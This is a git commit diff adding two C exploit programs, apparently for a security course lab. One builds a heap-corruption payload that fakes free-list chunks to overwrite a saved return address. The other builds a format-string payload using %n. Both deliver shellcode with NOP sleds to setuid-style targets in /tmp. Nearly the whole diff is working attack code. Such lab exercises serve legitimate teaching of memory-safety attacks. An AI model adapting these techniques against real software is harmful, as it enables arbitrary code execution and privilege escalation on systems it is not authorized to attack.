b934e7f40de9c2b3241d3995adbc68eca46ed575
James Mack <wolfbro@gmail.com>
2014-04-17 20:00:58 -0700

    Sploit 4 and Sploit 5 work

--- sploits/sploit4.c
+++ sploits/sploit4.c
@@ -4,15 +4,58 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target4"
+#define TARGET      "/tmp/target4"
+#define NOP         0x90                // NOP instruction
+#define ATTACK_SIZE 1024                // Size of the attack_string
 
 int main(void)
 {
     char *args[3];
     char *env[1];
 
-    args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
-    env[0] = NULL;
+    int i;                              // Loop counter
+    char * attack_string;               // The attack_string, oy this comment is redundant
+    char * char_ptr;                    // Pointer for traversing attack_string 1 byte at a time
+    long *addr_ptr;                     // Pointer for traversing attack_string 4 bytes at a time
+    int fake_right;
+    int chunk_left;
+    int chunk_right;
+
+    // Allocate memory for the attack string
+    attack_string = malloc(sizeof(char) * ATTACK_SIZE);
+
+    addr_ptr = (long *)attack_string;
+    char_ptr = attack_string;
+    chunk_left  = 0x8049a88;            // Address of our attack string
+    chunk_right = 0xbffff60c;           // Address of the saved eip
+    fake_right  = 0x87654321;           // fake address that passes the conditions in tfree
+
+    // 1. Fill attack_string with NOPs
+    for(i = 0; i < ATTACK_SIZE; i++) {
+        attack_string[i] = NOP;
+    }
+
+    // 2. Add 3 byte jmp
+    *(char_ptr + 2) = 0xeb;
+    *(char_ptr + 3) = 0x03;
+
+    // 3. Set the fake chunk addresses
+    *(addr_ptr + 1) = fake_right;
+    *(addr_ptr + 126) = chunk_left;
+    *(addr_ptr + 127) = chunk_right;
+
+    // 4. Copy shellcode to p's region
+    char_ptr = attack_string + 504 - strlen(shellcode) ;
+    for(i = 0; i < strlen(shellcode); i++) {
+        *(char_ptr++) = shellcode[i];
+    }
+
+    // 6. Add a NUL character to the end of the attack_string
+    attack_string[ATTACK_SIZE - 1] = '\0';
+
+    args[0] = TARGET;
+    args[1] = attack_string;
+    args[2] = NULL;
 
     if(0 > execve(TARGET, args, env)) {
         fprintf(stderr, "execve failed.\n");
--- sploits/sploit5.c
+++ sploits/sploit5.c
@@ -4,14 +4,56 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target5"
+#define TARGET      "/tmp/target5"
+#define NOP         0x90                // NOP instruction
+#define ATTACK_SIZE 400                 // Size of the attack_string
+#define EIP_ADDR    0xbffffcbd          // Address of where to write to
+
 
 int main(void)
 {
     char *args[3];
     char *env[1];
+    int i;                              // Loop counter, duh
+    char * attack_string;               // The attack_string, oy this comment is redundant
+    char * char_ptr;                    // Pointer for traversing attack_string 1 byte at a time
+    long *addr_ptr;                     // Pointer for traversing attack_string 4 bytes at a time
+    char * format_string;               // Format string to exploit the format string function
 
-    args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+
+    format_string = "%12582523u%n";
+
+    // Allocate memory for the attack string
+    attack_string = malloc(sizeof(char) * ATTACK_SIZE);
+
+    // 1. Fill attack_string with NOPs
+    for(i = 0; i < ATTACK_SIZE; i++) {
+        attack_string[i] = NOP;
+    }
+
+    // 2. Place the return address on the front of attack_string
+    addr_ptr = (long *)attack_string;
+    *(addr_ptr) = EIP_ADDR;
+
+    // 3. Place the format string on the end of attack_string, before the NUL termination
+    char_ptr = attack_string + (ATTACK_SIZE - 1 - strlen(format_string));
+    for(i = 0; i < strlen(format_string); i++) {
+        *(char_ptr++) = format_string[i];
+    }
+
+    // 4. Copy shellcode to the center of attack_string, between nop padding and format string
+    char_ptr = attack_string + (ATTACK_SIZE - 1 - strlen(shellcode) - strlen(format_string));
+    for(i = 0; i < strlen(shellcode); i++) {
+        *(char_ptr++) = shellcode[i];
+    }
+
+    // 5. Add a NUL character to the end of the attack_string
+    attack_string[ATTACK_SIZE - 1] = '\0';
+
+    args[0] = TARGET;
+    args[1] = attack_string;
+    args[2] = NULL;
+
     env[0] = NULL;
 
     if(0 > execve(TARGET, args, env)) {
